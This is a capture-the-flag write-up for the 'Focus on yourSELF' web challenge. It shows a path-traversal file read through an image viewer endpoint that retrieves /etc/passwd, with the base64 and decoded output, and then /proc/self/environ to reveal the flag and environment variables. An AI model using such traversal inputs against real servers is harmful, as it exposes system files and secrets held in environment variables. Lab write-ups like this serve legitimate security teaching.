# Focus on yourSELF

Have you focused on yourself recently? Author: NoobHacker

# Flag
```
FLAG=n00bz{Th3_3nv1r0nm3nt_det3rmine5_4h3_S3lF_6118da8168a7}
```

# Solution
There is an indirect LFI vulnerability in the `/view?image=` endpoint. By manipulating the filename, if a non-image file is rendered, the image `src` attribute returns base64-encoded data from the file.

`http://a25d7fa7-f7bf-4104-b9d1-6444f91db07a.challs.n00bzunit3d.xyz:8080/view?image=../../../../etc/passwd`:
```html
<img src="data:image/jpeg;base64, cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoCmJpbjp4OjE6MTpiaW46L2Jpbjovc2Jpbi9ub2xvZ2luCmRhZW1vbjp4OjI6MjpkYWVtb246L3NiaW46L3NiaW4vbm9sb2dpbgphZG06eDozOjQ6YWRtOi92YXIvYWRtOi9zYmluL25vbG9naW4KbHA6eDo0Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3NiaW4vbm9sb2dpbgpzeW5jOng6NTowOnN5bmM6L3NiaW46L2Jpbi9zeW5jCnNodXRkb3duOng6NjowOnNodXRkb3duOi9zYmluOi9zYmluL3NodXRkb3duCmhhbHQ6eDo3OjA6aGFsdDovc2Jpbjovc2Jpbi9oYWx0Cm1haWw6eDo4OjEyOm1haWw6L3Zhci9tYWlsOi9zYmluL25vbG9naW4KbmV3czp4Ojk6MTM6bmV3czovdXNyL2xpYi9uZXdzOi9zYmluL25vbG9naW4KdXVjcDp4OjEwOjE0OnV1Y3A6L3Zhci9zcG9vbC91dWNwcHVibGljOi9zYmluL25vbG9naW4Kb3BlcmF0b3I6eDoxMTowOm9wZXJhdG9yOi9yb290Oi9zYmluL25vbG9naW4KbWFuOng6MTM6MTU6bWFuOi91c3IvbWFuOi9zYmluL25vbG9naW4KcG9zdG1hc3Rlcjp4OjE0OjEyOnBvc3RtYXN0ZXI6L3Zhci9tYWlsOi9zYmluL25vbG9naW4KY3Jvbjp4OjE2OjE2OmNyb246L3Zhci9zcG9vbC9jcm9uOi9zYmluL25vbG9naW4KZnRwOng6MjE6MjE6Oi92YXIvbGliL2Z0cDovc2Jpbi9ub2xvZ2luCnNzaGQ6eDoyMjoyMjpzc2hkOi9kZXYvbnVsbDovc2Jpbi9ub2xvZ2luCmF0Ong6MjU6MjU6YXQ6L3Zhci9zcG9vbC9jcm9uL2F0am9iczovc2Jpbi9ub2xvZ2luCnNxdWlkOng6MzE6MzE6U3F1aWQ6L3Zhci9jYWNoZS9zcXVpZDovc2Jpbi9ub2xvZ2luCnhmczp4OjMzOjMzOlggRm9udCBTZXJ2ZXI6L2V0Yy9YMTEvZnM6L3NiaW4vbm9sb2dpbgpnYW1lczp4OjM1OjM1OmdhbWVzOi91c3IvZ2FtZXM6L3NiaW4vbm9sb2dpbgpjeXJ1czp4Ojg1OjEyOjovdXNyL2N5cnVzOi9zYmluL25vbG9naW4KdnBvcG1haWw6eDo4OTo4OTo6L3Zhci92cG9wbWFpbDovc2Jpbi9ub2xvZ2luCm50cDp4OjEyMzoxMjM6TlRQOi92YXIvZW1wdHk6L3NiaW4vbm9sb2dpbgpzbW1zcDp4OjIwOToyMDk6c21tc3A6L3Zhci9zcG9vbC9tcXVldWU6L3NiaW4vbm9sb2dpbgpndWVzdDp4OjQwNToxMDA6Z3Vlc3Q6L2Rldi9udWxsOi9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi86L3NiaW4vbm9sb2dpbgpjaGFsbDp4OjEwMDA6MTAwMDpMaW51eCBVc2VyLCwsOi9ob21lL2NoYWxsOi9iaW4vYmFzaAo=" alt="Large Image" class="w-full h-auto rounded">
```

Base64-decoded:
```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
chall:x:1000:1000:Linux User,,,:/home/chall:/bin/bash
```

As the flag is stored as an environment variable, the file `/proc/self/environ` can be read to get the flag.

```
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=fcdae5e44479
FLAG=n00bz{Th3_3nv1r0nm3nt_det3rmine5_4h3_S3lF_6118da8168a7}
...
```